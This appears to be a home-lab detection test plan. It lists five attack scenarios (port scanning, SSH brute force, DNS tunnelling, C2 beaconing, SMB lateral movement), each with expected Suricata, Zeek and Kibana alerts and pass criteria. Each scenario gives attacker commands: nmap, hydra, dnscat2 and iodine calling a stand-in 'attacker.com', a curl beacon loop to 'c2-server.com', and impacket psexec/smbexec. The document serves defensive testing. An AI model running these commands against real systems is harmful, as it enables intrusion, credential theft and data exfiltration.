# Repeatable Attack Scenarios

## Scenario 1: Port Scan (Reconnaissance)

**Objective:** Detect network reconnaissance activity.

**Attacker:** Kali (192.168.20.10)  
**Target:** Windows 10 (192.168.10.10)  
**Duration:** ~30 seconds

### Steps
```bash
# 1. SYN scan (stealth)
nmap -sS -p 1-1000 192.168.10.10

# 2. Service version detection
nmap -sV -p 22,80,443 192.168.10.10

# 3. OS detection
nmap -O 192.168.10.10
```

### Expected Detections
| Tool | Alert/Log | Rule ID |
|------|-----------|---------|
| Suricata | Port Scan Detected | 1000008 |
| Zeek | conn.log entries (S0 state) | N/A |
| pfSense | Firewall log (allowed/blocked) | N/A |

### Expected Kibana Query
```
src_ip: 192.168.20.10 AND dest_ip: 192.168.10.10 AND event_type: alert
```

### Pass Criteria
- [ ] Suricata alert fires within 5 seconds
- [ ] At least 3 distinct ports detected
- [ ] Zeek conn.log shows connection attempts
- [ ] Kibana shows alert with correct src/dst IPs

---

## Scenario 2: SSH Brute Force

**Objective:** Detect credential stuffing against SSH.

**Prerequisites:** Windows target must have OpenSSH Server installed and running.
```powershell
# On Windows target
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'
```

### Steps
```bash
# Hydra SSH brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 4 ssh://192.168.10.10

# Alternative: medusa
medusa -h 192.168.10.10 -u admin -P passwords.txt -M ssh
```

### Expected Detections
| Tool | Alert/Log | Rule ID |
|------|-----------|---------|
| Suricata | SSH Brute Force Attempt | 1000002 |
| Zeek | ssh.log (failed auth) | N/A |
| pfSense | Firewall log | N/A |

### Expected Kibana Query
```
src_ip: 192.168.20.10 AND dest_port: 22 AND event_type: alert
```

### Pass Criteria
- [ ] Suricata alert fires after 5 failed attempts
- [ ] Zeek ssh.log shows authentication failures
- [ ] Kibana shows >10 events in 60s window

---

## Scenario 3: DNS Tunneling

**Objective:** Detect data exfiltration via DNS.

**Attacker:** Kali (192.168.20.10)  
**Target:** DNS server (192.168.1.1)  
**Duration:** ~120 seconds

### Steps
```bash
# Using dnscat2
dnscat2 --dns domain=attacker.com

# Or iodine
iodine -f -P password attacker.com
```

### Expected Detections
| Tool | Alert/Log | Rule ID |
|------|-----------|---------|
| Suricata | Possible DNS Tunneling | 1000003 |
| Zeek | dns.log (long queries) | N/A |

### Expected Kibana Query
```
dns.query: * AND dns.query_length > 50
```

### Pass Criteria
- [ ] Suricata alert fires on long subdomain queries
- [ ] Zeek dns.log shows unusual query patterns
- [ ] Kibana shows DNS queries >50 chars

---

## Scenario 4: C2 Beaconing

**Objective:** Detect command-and-control communication.

**Attacker:** Kali (192.168.20.10)  
**Target:** C2 server (external)  
**Duration:** ~300 seconds (5 min)

### Steps
```bash
# Simulate beaconing with curl in a loop
while true; do
  curl -s http://c2-server.com/api/checkin?id=victim1
  sleep 60
done
```

### Expected Detections
| Tool | Alert/Log | Rule ID |
|------|-----------|---------|
| Suricata | Possible C2 Beaconing | 1000004 |
| Zeek | notice.log (C2_Beacon_Detected) | Custom script |
| pfSense | Firewall log | N/A |

### Expected Kibana Query
```
http.uri: /api/* AND src_ip: 192.168.10.10
```

### Pass Criteria
- [ ] Zeek notice fires after 5 beacons
- [ ] Suricata alert fires on threshold
- [ ] Kibana shows regular 60s interval pattern

---

## Scenario 5: SMB Lateral Movement

**Objective:** Detect lateral movement via SMB.

**Attacker:** Kali (192.168.20.10)  
**Target:** Windows 10 (192.168.10.10:445)  
**Duration:** ~30 seconds

### Steps
```bash
# Using impacket
python3 smbexec.py admin:password@192.168.10.10

# Or psexec
python3 psexec.py admin:password@192.168.10.10
```

### Expected Detections
| Tool | Alert/Log | Rule ID |
|------|-----------|---------|
| Suricata | SMB Lateral Movement Attempt | 1000005 |
| Zeek | smb.log (file access) | N/A |

### Expected Kibana Query
```
dest_port: 445 AND src_ip: 192.168.20.10
```

### Pass Criteria
- [ ] Suricata alert fires on SMB traffic
- [ ] Zeek smb.log shows file access
- [ ] Kibana shows SMB session from attacker

---

## Scenario Execution Checklist

For each scenario, complete:
- [ ] Pre-attack: Verify Suricata/Zeek running
- [ ] Execute attack from Kali
- [ ] Verify alert in Suricata fast.log
- [ ] Verify log in Zeek
- [ ] Verify event in Kibana
- [ ] Document findings in incident report
- [ ] Post-attack: Block attacker IP (if applicable)

---

*Built by Amdjed Salhi*